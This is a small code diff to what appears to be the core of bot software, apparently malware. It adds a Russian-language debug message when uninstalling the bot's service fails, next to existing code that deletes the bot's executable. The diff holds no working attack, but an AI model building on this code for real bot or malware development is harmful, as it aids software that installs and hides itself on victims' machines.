@@ -849,6 +849,9 @@ bool BOT::UninstallService()
 		COREDBG("BotCore", "Сервис деинсталирован. Удаляем ехе %s", ExeName.t_str());
 		DeleteBotFile(ExeName.t_str());
 	}
+	else
+    	COREDBG("BotCore", "Ошибка деинсталяции сервиса. Ошибка %d", pGetLastError());
+
 	return Result;
 }
 
